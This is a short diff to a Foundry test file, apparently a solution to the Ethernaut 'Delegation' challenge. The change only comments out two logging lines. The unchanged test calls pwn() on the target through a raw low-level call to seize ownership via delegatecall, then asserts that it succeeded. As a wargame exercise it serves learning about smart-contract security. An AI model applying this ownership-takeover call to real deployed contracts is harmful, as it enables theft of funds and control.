@@ -33,12 +33,12 @@ contract DelegationTest is Test {
     }
 
     function testDelegationHack() public testWrapper {
-        console2.log("_delegation before:", _delegation.owner());
+        //console2.log("_delegation before:", _delegation.owner());
         //(bool success, ) = address(_delegation).call{value: 0}(abi.encodeWithSignature("pwn()"));
         (bool success, ) = address(_delegation).call(
             abi.encode(bytes4(keccak256("pwn()")))
         );
         assertTrue(success);
-        console2.log("_delegation after:", _delegation.owner());
+        //console2.log("_delegation after:", _delegation.owner());
     }
 }
